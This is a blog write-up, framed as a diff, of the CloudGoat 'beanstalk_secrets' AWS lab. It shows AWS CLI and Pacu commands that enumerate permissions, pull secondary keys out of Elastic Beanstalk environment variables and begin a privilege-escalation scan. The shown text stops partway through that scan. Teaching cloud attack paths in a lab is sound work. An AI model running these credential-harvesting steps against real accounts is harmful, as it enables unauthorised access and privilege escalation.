@@ -1,0 +1,219 @@
+<!doctype html><html lang=en><head><title>Cloudgoat Beanstalk_Secrets Walkthrou :: Hacking Blog</title><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content="This is a wlakthrou of one of te easy environments provided by cloadgoat project"><meta name=keywords content="CTF,hacking,cybersecurity,notes,writeups"><meta name=robots content="noodp"><link rel=canonical href=https://hack.com.cy/writeups/cloudgoat/beanstalk_secrets/beanstalk_secrets/><link rel=stylesheet href=https://hack.com.cy/css/buttons.min.86f6b4c106b6c6eb690ae5203d36b442c1f66f718ff4e8164fa86cf6c61ad641.css><link rel=stylesheet href=https://hack.com.cy/css/code.min.d529ea4b2fb8d34328d7d31afc5466d5f7bc2f0bc9abdd98b69385335d7baee4.css><link rel=stylesheet href=https://hack.com.cy/css/fonts.min.5bb7ed13e1d00d8ff39ea84af26737007eb5051b157b86fc24487c94f3dc8bbe.css><link rel=stylesheet href=https://hack.com.cy/css/footer.min.eb8dfc2c6a7eafa36cd3ba92d63e69e849e2200e0002a228d137f236b09ecd75.css><link rel=stylesheet href=https://hack.com.cy/css/gist.min.a751e8b0abe1ba8bc53ced52a38b19d8950fe78ca29454ea8c2595cf26aad5c0.css><link rel=stylesheet href=https://hack.com.cy/css/header.min.75c7eb0e2872d95ff48109c6647d0223a38db52e2561dd87966eb5fc7c6bdac6.css><link rel=stylesheet href=https://hack.com.cy/css/main.min.775ac2af004d44c22a6d000fbd1d9af529642f5cef27399d0280d180af2c2e9b.css><link rel=stylesheet href=https://hack.com.cy/css/menu.min.310d32205bdedd6f43144e3c3273c9deecd238eba5f9108db5ea96ca0cfbe377.css><link rel=stylesheet href=https://hack.com.cy/css/pagination.min.bbb986dbce00a5ce5aca0504b7925fc1c581992a4bf57f163e5d69cc1db7d836.css><link rel=stylesheet href=https://hack.com.cy/css/post.min.ad50c7f4d00e7975918f37fc74c6029e1959a40d66fb5b2c6564a8715e985573.css><link rel=stylesheet href=https://hack.com.cy/css/sidebar.min.d99f1331c4dc2becb305a3d135a35844adbf5c1f39330853456f7e7f5864cb45.css><link rel=stylesheet href=https://hack.com.cy/css/syntax.min.e9ab635cf918bc84b901eb65c0b2caa74c9544245e3647c1af5c129896ef276e.css><link rel=stylesheet href=https://hack.com.cy/css/terminal.min.e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855.css><link rel=stylesheet href=https://hack.com.cy/css/terms.min.b81791663c3790e738e571cdbf802312390d30e4b1d8dc9d814a5b5454d0ac11.css><link rel=stylesheet href=https://hack.com.cy/terminal.css><link rel=stylesheet href=https://hack.com.cy/style.css><link rel="shortcut icon" href=https://hack.com.cy/favicon.png><link rel=apple-touch-icon href=https://hack.com.cy/apple-touch-icon.png><meta name=twitter:card content="summary"><meta name=twitter:site content><meta name=twitter:creator content><meta property="og:locale" content="en"><meta property="og:type" content="article"><meta property="og:title" content="Cloudgoat Beanstalk_Secrets Walkthrou"><meta property="og:description" content="This is a wlakthrou of one of te easy environments provided by cloadgoat project"><meta property="og:url" content="https://hack.com.cy/writeups/cloudgoat/beanstalk_secrets/beanstalk_secrets/"><meta property="og:site_name" content="Hacking Blog"><meta property="og:image" content="https://hack.com.cy/og-image.png"><meta property="og:image:width" content="1200"><meta property="og:image:height" content="627"><meta property="article:section" content="Cloud"><meta property="article:section" content="AWS"><meta property="article:published_time" content="2025-08-21 00:00:00 +0000 UTC"><meta name=theme-color content="#0a0e14"><meta name=color-scheme content="dark"><link rel=preload href=/fonts/FiraCode-Latin.woff2 as=font type=font/woff2 crossorigin><meta name=viewport content="width=device-width,initial-scale=1,viewport-fit=cover"><script src=https://cdn.jsdelivr.net/npm/fuse.js@6.6.2/dist/fuse.min.js></script><script defer src=https://hack.com.cy/js/search.js></script></head><body><div class="container center"><header class=header><div class=header__inner><div class=header__logo><a href=/why/><div class=logo>Hacking Vault</div></a></div><ul class="menu menu--mobile"><li class=menu__trigger>Menu&nbsp;▾</li><li><ul class=menu__dropdown><li><a href=/why/>Why</a></li><li><a href=/whoami/>Whoami</a></li><li><a href=/writeups/>Writeups</a></li><li><a href=/notes/>Notes</a></li></ul></li></ul></div><nav class=navigation-menu><ul class="navigation-menu__inner menu--desktop"><li><a href=/why/>Why</a></li><li><a href=/whoami/>Whoami</a></li><li><a href=/writeups/>Writeups</a></li><li><a href=/notes/>Notes</a></li><li><button class=search-button onclick=showSearch() aria-label=Search>Search</button></li></ul></nav></header><div class=content><nav class=breadcrumbs aria-label=Breadcrumb><ol class=breadcrumb-list><li class=breadcrumb-item><a href=https://hack.com.cy/ class=breadcrumb-link><span class=breadcrumb-icon>~</span>Home</a></li><li class=breadcrumb-separator>/</li><li class=breadcrumb-item><a href=https://hack.com.cy/writeups/ class=breadcrumb-link>echoCTF Writeups</a></li><li class=breadcrumb-separator>/</li><li class=breadcrumb-item><a href=https://hack.com.cy/writeups/cloudgoat/ class=breadcrumb-link>CloudGoat Writeups</a></li><li class=breadcrumb-separator>/</li><li class=breadcrumb-item><a href=https://hack.com.cy/writeups/cloudgoat/beanstalk_secrets/ class=breadcrumb-link></a></li><li class=breadcrumb-separator>/</li><li class="breadcrumb-item breadcrumb-current" aria-current=page><span class=breadcrumb-text>Cloudgoat Beanstalk_Secrets Walkthrou</span></li></ol></nav><style>.breadcrumbs{margin:20px 0 30px;padding:10px 15px;background:var(--background-secondary);border-left:3px solid var(--accent);border-right:1px solid var(--code-border);border-top:1px solid var(--code-border);border-bottom:1px solid var(--code-border)}.breadcrumb-list{display:flex;flex-wrap:wrap;align-items:center;list-style:none;margin:0;padding:0;gap:8px;font-size:.9rem}.breadcrumb-item{display:inline-flex;align-items:center}.breadcrumb-link{color:var(--accent-secondary);text-decoration:none;transition:all .2s ease;display:inline-flex;align-items:center;gap:5px}.breadcrumb-link:hover{color:var(--accent);text-shadow:0 0 5px var(--glow-accent)}.breadcrumb-icon{color:var(--accent);font-weight:700}.breadcrumb-separator{color:var(--code-border);user-select:none}.breadcrumb-current .breadcrumb-text{color:var(--foreground);font-weight:700}@media(max-width:684px){.breadcrumbs{font-size:.85rem;overflow-x:auto}.breadcrumb-list{flex-wrap:nowrap}}</style><article class=post><h1 class=post-title><a href=https://hack.com.cy/writeups/cloudgoat/beanstalk_secrets/beanstalk_secrets/>Cloudgoat Beanstalk_Secrets Walkthrou</a></h1><div class=post-meta><time class=post-date>2025-08-21&nbsp;[Updated 2026-01-01]</time><span class=post-reading-time>5 min read (889 words)</span></div><span class=post-tags>#<a href=https://hack.com.cy/tags/awc-cli/>AWC CLI</a>&nbsp;
+#<a href=https://hack.com.cy/tags/pacu/>Pacu</a>&nbsp;
+#<a href=https://hack.com.cy/tags/beanstalk/>beanstalk</a>&nbsp;</span><div class=table-of-contents><h2>Contents</h2><nav id=TableOfContents><ul><li><a href=#awc-cli-profile-creation>AWC CLI profile creation</a></li><li><a href=#enumeration-with--low_priv-credentials>Enumeration with <code>low_priv</code> credentials</a></li><li><a href=#iam-enumeration-with-pacu-what-privileges-do-our-user-have>IAM Enumeration with pacu (What Privileges do our user have?)</a></li><li><a href=#manually-enumerating-elastic-applications>Manually enumerating Elastic Applications</a></li><li><a href=#automating-the-process-with-pacu>Automating the process with pacu</a></li></ul><ul><li><a href=#creating-aws-profile-with-secondary-credentials>Creating aws profile with secondary credentials</a></li></ul></nav></div><div class=post-content><div><h1 id=initial-access--credentials>Initial Access / Credentials<a href=#initial-access--credentials class=hanchor arialabel=Anchor>#</a></h1><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=nv>initial_low_priv_credentials</span> <span class=o>=</span> Access Key: AKIA<span class=o>[</span>REDACTED-CTF<span class=o>]</span>
+</span></span><span class=line><span class=cl>Secret Key: <span class=o>[</span>REDACTED-CTF<span class=o>]</span>
+</span></span></code></pre></div><h2 id=awc-cli-profile-creation>AWC CLI profile creation<a href=#awc-cli-profile-creation class=hanchor arialabel=Anchor>#</a></h2><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>aws configure --profile low_priv
+</span></span><span class=line><span class=cl>AWS Access Key ID <span class=o>[</span>None<span class=o>]</span>: AKIA<span class=o>[</span>REDACTED-CTF<span class=o>]</span>
+</span></span><span class=line><span class=cl>AWS Secret Access Key <span class=o>[</span>None<span class=o>]</span>: <span class=o>[</span>REDACTED-CTF<span class=o>]</span>
+</span></span><span class=line><span class=cl>Default region name <span class=o>[</span>None<span class=o>]</span>: us-east-1
+</span></span><span class=line><span class=cl>Default output format <span class=o>[</span>None<span class=o>]</span>: json
+</span></span></code></pre></div><blockquote><p>Created an aws profile with the credentials given</p></blockquote><h2 id=enumeration-with--low_priv-credentials>Enumeration with <code>low_priv</code> credentials<a href=#enumeration-with--low_priv-credentials class=hanchor arialabel=Anchor>#</a></h2><p><strong>whoami</strong></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>└─$ aws sts get-caller-identity --profile low_priv 
+</span></span><span class=line><span class=cl><span class=o>{</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;UserId&#34;</span>: <span class=s2>&#34;AIDAUGVOUJQINCWVIJQHB&#34;</span>,
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;Account&#34;</span>: <span class=s2>&#34;289202785296&#34;</span>,
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;Arn&#34;</span>: <span class=s2>&#34;arn:aws:iam::289202785296:user/cgid9oc3krm0fl_low_priv_user&#34;</span>
+</span></span><span class=line><span class=cl><span class=o>}</span>
+</span></span></code></pre></div><blockquote><p>Gives us the username</p></blockquote><h2 id=iam-enumeration-with-pacu-what-privileges-do-our-user-have>IAM Enumeration with pacu (What Privileges do our user have?)<a href=#iam-enumeration-with-pacu-what-privileges-do-our-user-have class=hanchor arialabel=Anchor>#</a></h2><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>Pacu <span class=o>(</span>low_priv:imported-low_priv<span class=o>)</span> &gt; run iam__bruteforce_permissions --region us-east-1
+</span></span></code></pre></div><blockquote><p>Used the <strong>iam_bruteforce_permissions</strong> module from pacu</p></blockquote><p>**To view our the permissions that the module found we can use the whoami command</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>Pacu <span class=o>(</span>low_priv:imported-low_priv<span class=o>)</span> &gt; whoami
+</span></span><span class=line><span class=cl><span class=o>{</span>
+</span></span><span class=line><span class=cl>  <span class=s2>&#34;UserName&#34;</span>: <span class=s2>&#34;cgid9oc3krm0fl_low_priv_user&#34;</span>,
+</span></span><span class=line><span class=cl>  <span class=s2>&#34;RoleName&#34;</span>: null,
+</span></span><span class=line><span class=cl>  <span class=s2>&#34;Arn&#34;</span>: <span class=s2>&#34;arn:aws:iam::289202785296:user/cgid9oc3krm0fl_low_priv_user&#34;</span>,
+</span></span><span class=line><span class=cl>  <span class=s2>&#34;AccountId&#34;</span>: <span class=s2>&#34;289202785296&#34;</span>,
+</span></span><span class=line><span class=cl>  <span class=s2>&#34;UserId&#34;</span>: <span class=s2>&#34;AIDAUGVOUJQINCWVIJQHB&#34;</span>,
+</span></span><span class=line><span class=cl>  <span class=s2>&#34;Roles&#34;</span>: null,
+</span></span><span class=line><span class=cl>  <span class=s2>&#34;Groups&#34;</span>: <span class=o>[]</span>,
+</span></span><span class=line><span class=cl>  <span class=s2>&#34;Policies&#34;</span>: <span class=o>[]</span>,
+</span></span><span class=line><span class=cl>  <span class=s2>&#34;AccessKeyId&#34;</span>: <span class=s2>&#34;AKIA[REDACTED-CTF]&#34;</span>,
+</span></span><span class=line><span class=cl>  <span class=s2>&#34;SecretAccessKey&#34;</span>: <span class=s2>&#34;[REDACTED-CTF]&#34;</span>,
+</span></span><span class=line><span class=cl>  <span class=s2>&#34;SessionToken&#34;</span>: null,
+</span></span><span class=line><span class=cl>  <span class=s2>&#34;KeyAlias&#34;</span>: <span class=s2>&#34;imported-low_priv&#34;</span>,
+</span></span><span class=line><span class=cl>  <span class=s2>&#34;PermissionsConfirmed&#34;</span>: false,
+</span></span><span class=line><span class=cl>  <span class=s2>&#34;Permissions&#34;</span>: <span class=o>{</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;Allow&#34;</span>: <span class=o>[</span>
+</span></span><span class=line><span class=cl>      <span class=s2>&#34;ec2:DescribeSubnets&#34;</span>,
+</span></span><span class=line><span class=cl>      <span class=s2>&#34;dynamodb:DescribeEndpoints&#34;</span>,
+</span></span><span class=line><span class=cl>      <span class=s2>&#34;sts:GetCallerIdentity&#34;</span>,
+</span></span><span class=line><span class=cl>      <span class=s2>&#34;sts:GetSessionToken&#34;</span>
+</span></span><span class=line><span class=cl>    <span class=o>]</span>,
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;Deny&#34;</span>: <span class=o>[]</span>
+</span></span><span class=line><span class=cl>  <span class=o>}</span>
+</span></span><span class=line><span class=cl><span class=o>}</span>
+</span></span></code></pre></div><blockquote><p>-Under the <strong>Permissions</strong> we can see what we are allowed to do.</p></blockquote><p>I tried every single one of the permissions however none of it gave me data that i can work with.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>aws ec2 describe-subnets --profile low_priv
+</span></span><span class=line><span class=cl>aws dynamodb describe-endpoints --profile low_priv
+</span></span><span class=line><span class=cl>aws sts get-session-token --profile low_priv 
+</span></span></code></pre></div><p>With a bit of research regarding the word <strong>beanstalk</strong> which is the name of the lab I found the folloing description</p><blockquote><p>AWS Elastic Beanstalk enables customers to easily migrate, deploy, and scale full-stack applications</p></blockquote><p>Knowing this we can use <strong>aws cli</strong> to enumrate beanstalk applications and see what we have available</p><h2 id=manually-enumerating-elastic-applications>Manually enumerating Elastic Applications<a href=#manually-enumerating-elastic-applications class=hanchor arialabel=Anchor>#</a></h2><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>aws elasticbeanstalk describe-applications --profile low_priv
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=o>{</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;Applications&#34;</span>: <span class=o>[</span>
+</span></span><span class=line><span class=cl>        <span class=o>{</span>
+</span></span><span class=line><span class=cl>            <span class=s2>&#34;ApplicationArn&#34;</span>: <span class=s2>&#34;arn:aws:elasticbeanstalk:us-east-1:289202785296:application/cgid9oc3krm0fl-app&#34;</span>,
+</span></span><span class=line><span class=cl>            <span class=s2>&#34;ApplicationName&#34;</span>: <span class=s2>&#34;cgid9oc3krm0fl-app&#34;</span>,
+</span></span><span class=line><span class=cl>            <span class=s2>&#34;Description&#34;</span>: <span class=s2>&#34;Elastic Beanstalk application for insecure secrets scenario&#34;</span>,
+</span></span><span class=line><span class=cl>            <span class=s2>&#34;DateCreated&#34;</span>: <span class=s2>&#34;2025-08-21T06:54:26.949000+00:00&#34;</span>,
+</span></span><span class=line><span class=cl>            <span class=s2>&#34;DateUpdated&#34;</span>: <span class=s2>&#34;2025-08-21T06:54:26.949000+00:00&#34;</span>,
+</span></span><span class=line><span class=cl>            <span class=s2>&#34;ConfigurationTemplates&#34;</span>: <span class=o>[]</span>,
+</span></span><span class=line><span class=cl>            <span class=s2>&#34;ResourceLifecycleConfig&#34;</span>: <span class=o>{</span>
+</span></span><span class=line><span class=cl>                <span class=s2>&#34;VersionLifecycleConfig&#34;</span>: <span class=o>{</span>
+</span></span><span class=line><span class=cl>                    <span class=s2>&#34;MaxCountRule&#34;</span>: <span class=o>{</span>
+</span></span><span class=line><span class=cl>                        <span class=s2>&#34;Enabled&#34;</span>: false,
+</span></span><span class=line><span class=cl>                        <span class=s2>&#34;MaxCount&#34;</span>: 200,
+</span></span><span class=line><span class=cl>                        <span class=s2>&#34;DeleteSourceFromS3&#34;</span>: <span class=nb>false</span>
+</span></span><span class=line><span class=cl>                    <span class=o>}</span>,
+</span></span><span class=line><span class=cl>                    <span class=s2>&#34;MaxAgeRule&#34;</span>: <span class=o>{</span>
+</span></span><span class=line><span class=cl>                        <span class=s2>&#34;Enabled&#34;</span>: false,
+</span></span><span class=line><span class=cl>                        <span class=s2>&#34;MaxAgeInDays&#34;</span>: 180,
+</span></span><span class=line><span class=cl>                        <span class=s2>&#34;DeleteSourceFromS3&#34;</span>: <span class=nb>false</span>
+</span></span><span class=line><span class=cl>                    <span class=o>}</span>
+</span></span><span class=line><span class=cl>                <span class=o>}</span>
+</span></span><span class=line><span class=cl>            <span class=o>}</span>
+</span></span><span class=line><span class=cl>        <span class=o>}</span>
+</span></span><span class=line><span class=cl>    <span class=o>]</span>
+</span></span><span class=line><span class=cl><span class=o>}</span>
+</span></span></code></pre></div><blockquote><p>Now we have an application name</p></blockquote><p>We could also gather more information about the elastic application such as its environment details</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>aws elasticbeanstalk describe-environments --application-name cgid9oc3krm0fl-app --profile low_priv
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=o>{</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;Environments&#34;</span>: <span class=o>[</span>
+</span></span><span class=line><span class=cl>        <span class=o>{</span>
+</span></span><span class=line><span class=cl>            <span class=s2>&#34;EnvironmentName&#34;</span>: <span class=s2>&#34;cgid9oc3krm0fl-env&#34;</span>,
+</span></span><span class=line><span class=cl>            <span class=s2>&#34;EnvironmentId&#34;</span>: <span class=s2>&#34;e-xi5rv9xfmb&#34;</span>,
+</span></span><span class=line><span class=cl>            <span class=s2>&#34;ApplicationName&#34;</span>: <span class=s2>&#34;cgid9oc3krm0fl-app&#34;</span>,
+</span></span><span class=line><span class=cl>            <span class=s2>&#34;SolutionStackName&#34;</span>: <span class=s2>&#34;64bit Amazon Linux 2023 v4.7.1 running Python 3.11&#34;</span>,
+</span></span><span class=line><span class=cl>            <span class=s2>&#34;PlatformArn&#34;</span>: <span class=s2>&#34;arn:aws:elasticbeanstalk:us-east-1::platform/Python 3.11 running on 64bit Amazon Linux 2023/4.7.1&#34;</span>,
+</span></span><span class=line><span class=cl>            <span class=s2>&#34;EndpointURL&#34;</span>: <span class=s2>&#34;awseb-e-x-AWSEBLoa-DRIY4MZGVVYS-1616084218.us-east-1.elb.amazonaws.com&#34;</span>,
+</span></span><span class=line><span class=cl>            <span class=s2>&#34;CNAME&#34;</span>: <span class=s2>&#34;cgid9oc3krm0fl-env.eba-zppuezsg.us-east-1.elasticbeanstalk.com&#34;</span>,
+</span></span><span class=line><span class=cl>            <span class=s2>&#34;DateCreated&#34;</span>: <span class=s2>&#34;2025-08-21T06:54:43.342000+00:00&#34;</span>,
+</span></span><span class=line><span class=cl>            <span class=s2>&#34;DateUpdated&#34;</span>: <span class=s2>&#34;2025-08-21T06:57:41.594000+00:00&#34;</span>,
+</span></span><span class=line><span class=cl>            <span class=s2>&#34;Status&#34;</span>: <span class=s2>&#34;Ready&#34;</span>,
+</span></span><span class=line><span class=cl>            <span class=s2>&#34;AbortableOperationInProgress&#34;</span>: false,
+</span></span><span class=line><span class=cl>            <span class=s2>&#34;Health&#34;</span>: <span class=s2>&#34;Grey&#34;</span>,
+</span></span><span class=line><span class=cl>            <span class=s2>&#34;HealthStatus&#34;</span>: <span class=s2>&#34;No Data&#34;</span>,
+</span></span><span class=line><span class=cl>            <span class=s2>&#34;Tier&#34;</span>: <span class=o>{</span>
+</span></span><span class=line><span class=cl>                <span class=s2>&#34;Name&#34;</span>: <span class=s2>&#34;WebServer&#34;</span>,
+</span></span><span class=line><span class=cl>                <span class=s2>&#34;Type&#34;</span>: <span class=s2>&#34;Standard&#34;</span>,
+</span></span><span class=line><span class=cl>                <span class=s2>&#34;Version&#34;</span>: <span class=s2>&#34;1.0&#34;</span>
+</span></span><span class=line><span class=cl>            <span class=o>}</span>,
+</span></span><span class=line><span class=cl>            <span class=s2>&#34;EnvironmentLinks&#34;</span>: <span class=o>[]</span>,
+</span></span><span class=line><span class=cl>            <span class=s2>&#34;EnvironmentArn&#34;</span>: <span class=s2>&#34;arn:aws:elasticbeanstalk:us-east-1:289202785296:environment/cgid9oc3krm0fl-app/cgid9oc3krm0fl-env&#34;</span>
+</span></span><span class=line><span class=cl>        <span class=o>}</span>
+</span></span><span class=line><span class=cl>    <span class=o>]</span>
+</span></span><span class=line><span class=cl><span class=o>}</span>
+</span></span></code></pre></div><blockquote><p>We also have the applications environment name</p></blockquote><p>Equiped with this information we can now pull the application&rsquo;s configuration including its environment variables and possibily discover critical info.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>aws elasticbeanstalk describe-configuration-settings --application-name cgid9oc3krm0fl-app --environment-name cgid9oc3krm0fl-env --profile low_priv
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=s2>&#34;ConfigurationSettings&#34;</span>: <span class=o>[</span>
+</span></span><span class=line><span class=cl>        <span class=o>{</span>
+</span></span><span class=line><span class=cl>            ---&lt;snip&gt;---
+</span></span><span class=line><span class=cl>                <span class=o>{</span>
+</span></span><span class=line><span class=cl>                    <span class=s2>&#34;Namespace&#34;</span>: <span class=s2>&#34;aws:cloudformation:template:parameter&#34;</span>,
+</span></span><span class=line><span class=cl>                    <span class=s2>&#34;OptionName&#34;</span>: <span class=s2>&#34;EnvironmentVariables&#34;</span>,
+</span></span><span class=line><span class=cl>                    <span class=s2>&#34;Value&#34;</span>: <span class=s2>&#34;SECONDARY_SECRET_KEY=[REDACTED-CTF2],PYTHONPATH=/var/app/venv/staging-LQM1lest/bin,SECONDARY_ACCESS_KEY=AKIA[REDACTED-CTF2]&#34;</span>
+</span></span><span class=line><span class=cl>                <span class=o>}</span>
+</span></span><span class=line><span class=cl>            ---&lt;snip&gt;---
+</span></span></code></pre></div><blockquote><p>Found Keys within the environment variables
+This enumeration could also be done using pacu.</p></blockquote><h2 id=automating-the-process-with-pacu>Automating the process with pacu<a href=#automating-the-process-with-pacu class=hanchor arialabel=Anchor>#</a></h2><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>Pacu <span class=o>(</span>low_priv_sess:imported-low_priv_sess<span class=o>)</span> &gt; run elasticbeanstalk__enum --regions us-east-1
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>  Running module elasticbeanstalk__enum...
+</span></span><span class=line><span class=cl><span class=o>[</span>elasticbeanstalk__enum<span class=o>]</span> Enumerating BeanStalk data in region us-east-1...
+</span></span><span class=line><span class=cl><span class=o>[</span>elasticbeanstalk__enum<span class=o>]</span>   <span class=m>1</span> application<span class=o>(</span>s<span class=o>)</span> found in us-east-1.
+</span></span><span class=line><span class=cl><span class=o>[</span>elasticbeanstalk__enum<span class=o>]</span>   <span class=m>1</span> environment<span class=o>(</span>s<span class=o>)</span> found in us-east-1.
+</span></span><span class=line><span class=cl>        Potential secret in environment variable: <span class=nv>SSHSourceRestriction</span> <span class=o>=</span>&gt; tcp,22,22,0.0.0.0/0
+</span></span><span class=line><span class=cl>        
+</span></span><span class=line><span class=cl>        Potential secret in environment variable: <span class=nv>EnvironmentVariables</span> <span class=o>=</span>&gt; <span class=nv>SECONDARY_SECRET_KEY</span><span class=o>=[</span>REDACTED-CTF2<span class=o>]</span>,PYTHONPATH<span class=o>=</span>/var/app/venv/staging-LQM1lest/bin,SECONDARY_ACCESS_KEY<span class=o>=</span>AKIA<span class=o>[</span>REDACTED-CTF2<span class=o>]</span>
+</span></span><span class=line><span class=cl>        Potential secret in environment variable: <span class=nv>SECONDARY_ACCESS_KEY</span> <span class=o>=</span>&gt; AKIA<span class=o>[</span>REDACTED-CTF2<span class=o>]</span>
+</span></span></code></pre></div><blockquote><p>Now lets create another profile with the new credentilas that we have and start our enumeration process as we did before</p></blockquote><h1 id=secondary-credentials>Secondary Credentials<a href=#secondary-credentials class=hanchor arialabel=Anchor>#</a></h1><h2 id=creating-aws-profile-with-secondary-credentials>Creating aws profile with secondary credentials<a href=#creating-aws-profile-with-secondary-credentials class=hanchor arialabel=Anchor>#</a></h2><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>aws configure --profile env_key      
+</span></span><span class=line><span class=cl>AWS Access Key ID <span class=o>[</span>None<span class=o>]</span>: AKIA<span class=o>[</span>REDACTED-CTF2<span class=o>]</span>
+</span></span><span class=line><span class=cl>AWS Secret Access Key <span class=o>[</span>None<span class=o>]</span>: <span class=o>[</span>REDACTED-CTF2<span class=o>]</span>
+</span></span><span class=line><span class=cl>Default region name <span class=o>[</span>None<span class=o>]</span>: us-east-1
+</span></span><span class=line><span class=cl>Default output format <span class=o>[</span>None<span class=o>]</span>: json
+</span></span></code></pre></div><blockquote><p>Called the new profile env_key since we got the credentials from the environemnt variables</p></blockquote><p><strong>whoami</strong></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>aws sts get-caller-identity --profile env_key      
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=o>{</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;UserId&#34;</span>: <span class=s2>&#34;AIDAUGVOUJQIKXL6FUYGK&#34;</span>,
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;Account&#34;</span>: <span class=s2>&#34;289202785296&#34;</span>,
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;Arn&#34;</span>: <span class=s2>&#34;arn:aws:iam::289202785296:user/cgid9oc3krm0fl_secondary_user&#34;</span>
+</span></span><span class=line><span class=cl><span class=o>}</span>
+</span></span></code></pre></div><blockquote><p>Username of the new user is <strong>cgid9oc3krm0fl_secondary_user</strong></p></blockquote><p><strong>using pacu to enumerate the IAM permissions of the new user using another module called &ldquo;iam__enum_permissions&rdquo;</strong></p><p><strong>checking our permissions</strong></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>Pacu <span class=o>(</span>env_key:imported-env_key<span class=o>)</span> &gt; whoami
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=o>{</span>
+</span></span><span class=line><span class=cl>  <span class=s2>&#34;UserName&#34;</span>: <span class=s2>&#34;cgid9oc3krm0fl_secondary_user&#34;</span>,
+</span></span><span class=line><span class=cl>  <span class=s2>&#34;RoleName&#34;</span>: null,
+</span></span><span class=line><span class=cl>  <span class=s2>&#34;Arn&#34;</span>: <span class=s2>&#34;arn:aws:iam::289202785296:user/cgid9oc3krm0fl_secondary_user&#34;</span>,
+</span></span><span class=line><span class=cl>  <span class=s2>&#34;AccountId&#34;</span>: <span class=s2>&#34;289202785296&#34;</span>,
+</span></span><span class=line><span class=cl>  <span class=s2>&#34;UserId&#34;</span>: <span class=s2>&#34;AIDAUGVOUJQIKXL6FUYGK&#34;</span>,
+</span></span><span class=line><span class=cl>  <span class=s2>&#34;Roles&#34;</span>: null,
+</span></span><span class=line><span class=cl>  <span class=s2>&#34;Groups&#34;</span>: <span class=o>[]</span>,
+</span></span><span class=line><span class=cl>  <span class=s2>&#34;Policies&#34;</span>: <span class=o>[</span>
+</span></span><span class=line><span class=cl>    <span class=o>{</span>
+</span></span><span class=line><span class=cl>      <span class=s2>&#34;PolicyName&#34;</span>: <span class=s2>&#34;cgid9oc3krm0fl_secondary_policy&#34;</span>,
+</span></span><span class=line><span class=cl>      <span class=s2>&#34;PolicyArn&#34;</span>: <span class=s2>&#34;arn:aws:iam::289202785296:policy/cgid9oc3krm0fl_secondary_policy&#34;</span>
+</span></span><span class=line><span class=cl>    <span class=o>}</span>
+</span></span><span class=line><span class=cl>  <span class=o>]</span>,
+</span></span><span class=line><span class=cl>  <span class=s2>&#34;AccessKeyId&#34;</span>: <span class=s2>&#34;AKIA[REDACTED-CTF2]&#34;</span>,
+</span></span><span class=line><span class=cl>  <span class=s2>&#34;SecretAccessKey&#34;</span>: <span class=s2>&#34;[REDACTED-CTF2]&#34;</span>,
+</span></span><span class=line><span class=cl>  <span class=s2>&#34;SessionToken&#34;</span>: null,
+</span></span><span class=line><span class=cl>  <span class=s2>&#34;KeyAlias&#34;</span>: <span class=s2>&#34;imported-env_key&#34;</span>,
+</span></span><span class=line><span class=cl>  <span class=s2>&#34;PermissionsConfirmed&#34;</span>: false,
+</span></span><span class=line><span class=cl>  <span class=s2>&#34;Permissions&#34;</span>: <span class=o>{</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;Allow&#34;</span>: <span class=o>{</span>
+</span></span><span class=line><span class=cl>      <span class=s2>&#34;iam:createaccesskey&#34;</span>: <span class=o>{</span>
+</span></span><span class=line><span class=cl>        <span class=s2>&#34;Resources&#34;</span>: <span class=o>[</span>
+</span></span><span class=line><span class=cl>          <span class=s2>&#34;*&#34;</span>
+</span></span><span class=line><span class=cl>        <span class=o>]</span>
+</span></span><span class=line><span class=cl>      <span class=o>}</span>,
+</span></span><span class=line><span class=cl>            ---&lt;snip&gt;---
+</span></span></code></pre></div><blockquote><p>It seems that we can create access keys for any IAM user that exists!</p></blockquote><p>We could also autmote this process using pacu module called <strong>iam__privesc__scan</strong></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>Pacu <span class=o>(</span>env_key:imported-env_key<span class=o>)</span> &gt; run iam__privesc_scan --scan-only
+</span></span><span class=line><span class=cl>  Running module iam__privesc_scan...
+</span></span><span class=line><span class=cl><span class=o>[</span>iam__privesc_scan<span class=o>]</span> Escalation methods <span class=k>for</span> current user:
